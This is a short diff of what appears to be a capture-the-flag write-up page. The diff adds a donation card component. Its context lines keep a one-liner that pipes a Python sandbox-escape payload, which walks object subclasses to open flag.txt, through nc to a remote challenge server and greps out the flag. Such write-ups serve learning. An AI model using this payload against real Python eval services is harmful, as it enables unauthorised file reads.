@@ -76,3 +76,7 @@ I'll throw the following line here as well, for reference
 ```python
 echo 'int(().__class__.__base__.__subclasses__()[40]("flag.txt","r").read())' | nc 188.166.145.178 31960 | grep -o CHTB{.*} --color=none
 ```
+
+import DonateCard from '@site/src/components/DonateCard';
+
+<DonateCard/>
